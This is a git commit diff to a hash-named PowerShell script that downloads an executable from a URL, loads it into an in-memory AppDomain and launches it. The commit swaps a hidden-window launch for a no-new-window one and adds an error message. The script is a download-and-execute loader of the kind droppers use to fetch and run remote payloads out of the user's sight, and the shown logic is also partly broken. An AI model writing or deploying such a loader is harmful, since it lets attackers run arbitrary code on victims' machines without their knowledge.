66aa6b9d4a078e307d5536f5961b27b8878969ed
j <106011930+j-v2@users.noreply.github.com>
2023-10-29 01:07:01 +1300

    Update 93d68ca8b56629ddac9b5cb3102d4b92b7317330aad4d5473290831e901c13c12d2cef39f90e1181cb47971a3c1bd9238a6fe8cab442bebde83de49c21d5822a.ps1

--- 93d68ca8b56629ddac9b5cb3102d4b92b7317330aad4d5473290831e901c13c12d2cef39f90e1181cb47971a3c1bd9238a6fe8cab442bebde83de49c21d5822a.ps1
+++ 93d68ca8b56629ddac9b5cb3102d4b92b7317330aad4d5473290831e901c13c12d2cef39f90e1181cb47971a3c1bd9238a6fe8cab442bebde83de49c21d5822a.ps1
@@ -5,7 +5,11 @@ $executableBytes = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
 if ($executableBytes) {
     $appDomain = [System.AppDomain]::CreateDomain("InMemoryDomain")
     $assembly = $appDomain.Load($executableBytes)
-    Start-Process -FilePath $assembly.EntryPoint.Module.FullyQualifiedName -WindowStyle Hidden
+
+    # Start the executable without creating a new window
+    Start-Process -FilePath $assembly.EntryPoint.Module.FullyQualifiedName -NoNewWindow
+
     [System.AppDomain]::Unload($appDomain)
 } else {
+    Write-Host "Download failed."
 }
